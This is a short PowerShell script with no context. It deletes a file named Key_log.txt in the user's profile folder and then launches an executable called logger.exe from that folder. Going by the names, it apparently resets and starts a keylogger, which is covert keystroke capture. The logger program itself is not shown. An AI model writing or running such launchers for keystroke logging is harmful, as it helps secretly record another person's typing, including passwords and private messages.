$path = echo $env:USERPROFILE\Key_log.txt
del $path
echo "deleted"
cd $env:USERPROFILE
.\logger.exe
exit